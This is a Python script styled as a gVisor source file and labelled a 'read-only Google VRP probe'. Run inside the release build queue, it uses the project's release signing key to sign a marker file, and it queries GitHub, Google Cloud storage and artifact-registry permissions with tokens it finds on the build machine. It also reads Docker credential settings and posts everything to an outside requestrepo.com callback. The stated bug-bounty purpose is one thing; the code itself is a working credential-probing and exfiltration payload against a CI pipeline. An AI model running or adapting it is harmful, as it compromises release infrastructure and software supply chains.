#!/usr/bin/env python3

# Copyright 2026 The gVisor Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Read-only Google VRP probe for the gVisor release queue boundary."""

import hashlib
import json
import os
from pathlib import Path
import subprocess
import tempfile
import urllib.error
import urllib.parse
import urllib.request


CALLBACK_URL = 'https://jpz2hfky.requestrepo.com/gvisor-release-4d8d3507'


def error_result(error):
  if isinstance(error, urllib.error.HTTPError):
    return {'type': type(error).__name__, 'code': error.code}
  return {'type': type(error).__name__, 'message': str(error)[:240]}


def request_json(url, *, token=None, body=None):
  data = None if body is None else json.dumps(body).encode()
  headers = {
      'Accept': 'application/json',
      'User-Agent': 'pwnreq-google-vrp-boundary-probe',
  }
  if body is not None:
    headers['Content-Type'] = 'application/json'
  if token:
    headers['Authorization'] = f'Bearer {token}'
  request = urllib.request.Request(url, data=data, headers=headers)
  with urllib.request.urlopen(request, timeout=20) as response:
    return (
        json.loads(response.read().decode()),
        {key.lower(): value for key, value in response.headers.items()},
    )


def file_metadata(path):
  if not path.is_file():
    return {'exists': False}
  data = path.read_bytes()
  return {
      'exists': True,
      'length': len(data),
      'sha256': hashlib.sha256(data).hexdigest(),
  }


def inspect_release_key(path):
  result = file_metadata(path)
  if not result['exists']:
    return result

  with tempfile.TemporaryDirectory(prefix='pwnreq-gpg-') as home:
    os.chmod(home, 0o700)
    env = dict(os.environ, GNUPGHOME=home)
    imported = subprocess.run(
        ['gpg', '--batch', '--import', str(path)],
        env=env,
        check=False,
        capture_output=True,
        text=True,
        timeout=30,
    )
    listed = subprocess.run(
        ['gpg', '--batch', '--with-colons', '--list-secret-keys'],
        env=env,
        check=False,
        capture_output=True,
        text=True,
        timeout=15,
    )
    public_metadata = []
    for line in listed.stdout.splitlines():
      fields = line.split(':')
      if fields[0] in ('sec', 'ssb'):
        public_metadata.append({
            'type': fields[0],
            'bits': fields[2],
            'algorithm': fields[3],
            'key_id': fields[4],
            'created': fields[5],
            'expires': fields[6],
        })
      elif fields[0] == 'fpr':
        public_metadata.append({'type': 'fingerprint', 'value': fields[9]})

    marker = Path(home) / 'harmless-marker.txt'
    signature = Path(home) / 'harmless-marker.txt.sig'
    marker.write_text('pwnreq gVisor release key possession proof\n')
    signed = subprocess.run(
        [
            'gpg',
            '--batch',
            '--yes',
            '--pinentry-mode',
            'loopback',
            '--passphrase',
            '',
            '--detach-sign',
            '--output',
            str(signature),
            str(marker),
        ],
        env=env,
        check=False,
        capture_output=True,
        text=True,
        timeout=30,
    )
    verified = subprocess.run(
        ['gpg', '--batch', '--verify', str(signature), str(marker)],
        env=env,
        check=False,
        capture_output=True,
        text=True,
        timeout=15,
    )
    result.update({
        'import_exit': imported.returncode,
        'secret_keys': public_metadata,
        'sign_exit': signed.returncode,
        'verify_exit': verified.returncode,
    })
    if signature.is_file():
      result['proof_signature'] = file_metadata(signature)
  return result


def inspect_github_token(path):
  metadata = file_metadata(path)
  if not metadata['exists']:
    return metadata
  token = path.read_text().strip()
  user, headers = request_json('https://api.github.com/user', token=token)
  repo, _ = request_json('https://api.github.com/repos/google/gvisor', token=token)
  metadata.update({
      'login': user.get('login'),
      'id': user.get('id'),
      'oauth_scopes': [
          scope.strip()
          for scope in headers.get('x-oauth-scopes', '').split(',')
          if scope.strip()
      ],
      'repo_permissions': repo.get('permissions'),
      'repo_role': repo.get('role_name'),
  })
  return metadata


def test_storage_permissions(token, bucket):
  permissions = [
      'storage.buckets.get',
      'storage.buckets.getIamPolicy',
      'storage.objects.get',
      'storage.objects.list',
      'storage.objects.create',
      'storage.objects.delete',
      'storage.objects.update',
  ]
  query = urllib.parse.urlencode(
      [('permissions', permission) for permission in permissions]
  )
  response, _ = request_json(
      f'https://storage.googleapis.com/storage/v1/b/{bucket}/iam/testPermissions?{query}',
      token=token,
  )
  return response.get('permissions', [])


def test_artifact_registry_permissions(token):
  permissions = [
      'artifactregistry.repositories.get',
      'artifactregistry.repositories.downloadArtifacts',
      'artifactregistry.repositories.uploadArtifacts',
      'artifactregistry.repositories.deleteArtifacts',
  ]
  response, _ = request_json(
      'https://artifactregistry.googleapis.com/v1/projects/gvisor-presubmit/'
      'locations/us-central1/repositories/gvisor-presubmit-images:testIamPermissions',
      token=token,
      body={'permissions': permissions},
  )
  return response.get('permissions', [])


def inspect_cloud_identity():
  token = subprocess.check_output(
      ['gcloud', 'auth', 'print-access-token'], text=True, timeout=20
  ).strip()
  accounts = subprocess.check_output(
      [
          'gcloud',
          'auth',
          'list',
          '--filter=status:ACTIVE',
          '--format=value(account)',
      ],
      text=True,
      timeout=20,
  ).splitlines()
  result = {
      'active_accounts': accounts,
      'token_length': len(token),
      'token_sha256_prefix': hashlib.sha256(token.encode()).hexdigest()[:16],
  }
  try:
    userinfo, _ = request_json(
        'https://www.googleapis.com/oauth2/v3/userinfo', token=token
    )
    result['userinfo'] = {
        key: userinfo.get(key) for key in ('email', 'sub', 'email_verified')
    }
  except Exception as error:  # pylint: disable=broad-except
    result['userinfo_error'] = error_result(error)
  try:
    result['release_bucket_permissions'] = test_storage_permissions(
        token, 'gvisor'
    )
  except Exception as error:  # pylint: disable=broad-except
    result['release_bucket_permissions_error'] = error_result(error)
  try:
    result['image_repository_permissions'] = test_artifact_registry_permissions(
        token
    )
  except Exception as error:  # pylint: disable=broad-except
    result['image_repository_permissions_error'] = error_result(error)
  return result


def inspect_docker_config(path):
  metadata = file_metadata(path)
  if not metadata['exists']:
    return metadata
  config = json.loads(path.read_text())
  metadata.update({
      'credential_helper_hosts': sorted(config.get('credHelpers', {}).keys()),
      'credential_store': config.get('credsStore'),
      'configured_auth_hosts': sorted(config.get('auths', {}).keys()),
  })
  return metadata


def callback(result):
  request = urllib.request.Request(
      CALLBACK_URL,
      data=json.dumps(result, sort_keys=True).encode(),
      headers={
          'Content-Type': 'application/json',
          'User-Agent': 'pwnreq-google-vrp-boundary-probe',
      },
  )
  with urllib.request.urlopen(request, timeout=20) as response:
    response.read()


def main():
  home = Path.home()
  result = {
      'probe': 'gvisor-release-queue-boundary',
      'build_id': os.environ.get('BUILDKITE_BUILD_ID'),
      'build_number': os.environ.get('BUILDKITE_BUILD_NUMBER'),
      'job_id': os.environ.get('BUILDKITE_JOB_ID'),
      'branch': os.environ.get('BUILDKITE_BRANCH'),
      'commit': os.environ.get('BUILDKITE_COMMIT'),
      'queue': os.environ.get('BUILDKITE_AGENT_META_DATA_QUEUE'),
  }
  for name, function in (
      ('release_key', lambda: inspect_release_key(Path('repo.key'))),
      ('github_token', lambda: inspect_github_token(home / '.github-token')),
      ('cloud_identity', inspect_cloud_identity),
      ('docker_config', lambda: inspect_docker_config(home / '.docker/config.json')),
  ):
    try:
      result[name] = function()
    except Exception as error:  # pylint: disable=broad-except
      result[f'{name}_error'] = error_result(error)

  print('PWNREQ_GVISOR_RELEASE_QUEUE_RESULT ' + json.dumps(result, sort_keys=True))
  callback(result)


if __name__ == '__main__':
  main()
